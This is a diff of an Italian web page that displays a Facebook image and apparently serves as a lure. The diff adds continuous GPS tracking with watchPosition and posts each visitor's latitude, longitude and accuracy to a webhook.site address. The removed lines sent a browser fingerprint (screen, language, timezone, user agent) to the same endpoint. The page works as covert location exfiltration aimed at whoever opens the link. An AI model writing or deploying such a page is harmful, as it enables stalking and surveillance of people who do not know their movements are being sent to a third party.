@@ -2,56 +2,62 @@
 <html lang="it">
 <head>
   <meta charset="UTF-8">
+  <title>Tracking GPS in tempo reale</title>
 </head>
 <body>
+  <h2>Tracking GPS - aggiornamento continuo</h2>
   <img src="https://scontent.ftrn1-1.fna.fbcdn.net/v/t39.30808-6/512605176_10237473596609160_4950655024629029266_n.jpg?_nc_cat=106&ccb=1-7&_nc_sid=127cfc&_nc_ohc=KdnjTC5dc8AQ7kNvwGLhBw5&_nc_oc=AdkyzSjHu--bUwA-s6X0Tk4eWAZmGwAjhRU6AoLmrLNP7VrOJdHP5c-Z0s7JI64lPYE&_nc_zt=23&_nc_ht=scontent.ftrn1-1.fna&_nc_gid=3DN_YMxs-b9ZxibRY5IyLw&oh=00_AfMLYgPb8jlAbN4TbHDtt9Vxuw0G0BWXb4JWCebO-sp7ug&oe=6862080A" alt="Immagine" style="max-width:100%; height:auto;" />
 
-  <p id="status">📍 In attesa di autorizzazione per la posizione GPS...</p>
+  <p id="status">📍 Attivazione localizzazione...</p>
+  <p id="coords"></p>
 
   <script>
-    // INVIO DATI A WEBHOOK
     function sendData(data) {
       const params = new URLSearchParams(data);
       fetch('https://webhook.site/bf09bda5-39da-4f1f-882e-afe0809ba89f', { method: 'POST', body: params });
     }
 
-    // INFO BASE
-    const info = {
-      timestamp: Date.now(),
-      screen: screen.width + "x" + screen.height,
-      lang: navigator.language,
-      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      ua: navigator.userAgent
-    };
-    sendData(info);
-
-    // GPS FORZATO
     const statusEl = document.getElementById("status");
+    const coordsEl = document.getElementById("coords");
 
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
+      const watchId = navigator.geolocation.watchPosition(
         position => {
-          statusEl.textContent = "✅ Posizione ottenuta via GPS!";
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const acc = position.coords.accuracy;
+          const timestamp = Date.now();
+
+          statusEl.textContent = "✅ Posizione aggiornata!";
+          coordsEl.textContent = `Lat: ${lat} | Lon: ${lon} | Precisione: ${acc} metri`;
+
           sendData({
-            lat: position.coords.latitude,
-            lon: position.coords.longitude,
-            acc: position.coords.accuracy,
-            gps_ts: Date.now()
+            lat: lat,
+            lon: lon,
+            acc: acc,
+            gps_ts: timestamp
           });
+
+          // Feedback di precisione
+          if (acc > 100) {
+            alert("⚠️ Probabile posizione stimata via IP/Wi-Fi");
+          } else {
+            console.log("GPS reale rilevato.");
+          }
         },
         error => {
           statusEl.textContent = "❌ Errore: " + error.message;
           sendData({ gps_error: error.message });
         },
         {
-          enableHighAccuracy: true,  // 👉 forza l'uso del GPS
-          timeout: 15000,            // 15 secondi max
-          maximumAge: 0              // nessuna posizione vecchia
+          enableHighAccuracy: true, // Forza GPS
+          timeout: 15000,
+          maximumAge: 0
         }
       );
     } else {
       statusEl.textContent = "❌ Il browser non supporta la geolocalizzazione.";
     }
-  </script>
+ </script>
 </body>
 </html>
